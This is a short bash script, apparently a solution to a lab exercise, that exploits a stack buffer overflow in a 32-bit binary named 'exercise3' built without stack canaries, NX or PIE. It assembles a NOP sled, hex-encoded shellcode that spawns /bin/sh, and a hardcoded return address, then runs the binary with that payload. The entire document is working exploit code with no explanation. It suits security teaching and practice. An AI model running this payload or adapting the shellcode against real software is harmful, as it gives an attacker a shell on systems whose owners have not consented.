#!/bin/bash
#exercise3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=fcf06b31672b632c3d3d573969aec3131dc7000b, for GNU/Linux 3.2.0, with debug_info, not stripped
    #Arch:     i386-32-little
    #RELRO:    Partial RELRO
    #Stack:    No canary found
    #NX:       NX disabled
    #PIE:      No PIE (0x8048000)
    #RWX:      Has RWX segments

buffer=112
shell_code="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nop_sled=""
shell_len=${#shell_code}

let "shell_len = ((shell_len-7)/4)+7"
let "nop_len = $buffer-$shell_len"

for ((i=1; i<=$nop_len; i++))
do 
    nop_sled+="\x90"
done

ret_addr="\x04\xce\xff\xff"
payload=$nop_sled$shell_code$ret_addr
#cgdb --args ./exercise3 "`echo -e $payload`" ret_addr="\x40\xcd\xff\xff"
./exercise3 "`echo -e $payload`"